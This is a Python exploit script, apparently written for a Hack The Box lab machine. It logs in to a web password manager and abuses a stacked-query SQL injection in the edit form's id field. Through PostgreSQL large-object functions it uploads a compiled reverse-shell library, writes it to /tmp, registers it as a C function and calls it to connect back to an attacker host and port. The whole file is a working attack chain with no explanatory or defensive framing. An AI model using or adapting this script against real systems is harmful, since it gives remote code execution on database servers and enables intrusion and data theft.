import requests
import random
import string
from urllib.parse import quote_plus
import math

BASE_URL = "http://10.129.204.251:8080"
LHOST = "10.10.14.2"
LPORT = 7331
USERNAME = "admin"
PASSWORD = "test" # !!!!Replace it with password used when reseting the password of the admin user.

s = requests.Session()
r = s.post(
    f"{BASE_URL}/login",
    headers = {"Content-Type":"application/x-www-form-urlencoded"},
    data = f"username={USERNAME}&password={PASSWORD}"
)

if "My Passwords</h1>" in r.text:
    print("[*] Logged in")
else:
    print("Could not log in. Check the credentials!\nUse the same password when you reset it for the admin user.")
    exit(1)

def oracle(s, q):
    r = s.post(
        f"{BASE_URL}/dashboard/edit",
        headers = {"Content-Type":"application/x-www-form-urlencoded"},
        data = f"username={USERNAME}&password={PASSWORD}&title=Hackthebox&id={quote_plus(q)}"
    )
    return "Password edited!" in r.text

with open("pg_rev_shell.so","rb") as f:
    raw = f.read()

loid = random.randint(50000,60000)
oracle(s, f"1;SELECT lo_create({loid})--")
print(f"[*] Created large object with ID: {loid}")

for pageno in range(math.ceil(len(raw)/2048)):
    page = raw[pageno*2048:pageno*2048+2048]
    print(f"[*] Uploading Page: {pageno}, Offset: {pageno*2048}")
    oracle(s, f"1;SELECT lo_put({loid}, {pageno*2048}, decode($${page.hex()}$$,$$hex$$))--")

query  = f"1;SELECT lo_export({loid}, $$/tmp/pg_rev_shell.so$$);"
query += f"SELECT lo_unlink({loid});"
query += "DROP FUNCTION IF EXISTS rev_shell;"
query += "CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS $$/tmp/pg_rev_shell$$, $$rev_shell$$ LANGUAGE C STRICT;"
query += f"SELECT rev_shell($${LHOST}$$, {LPORT})--"
oracle(s, query)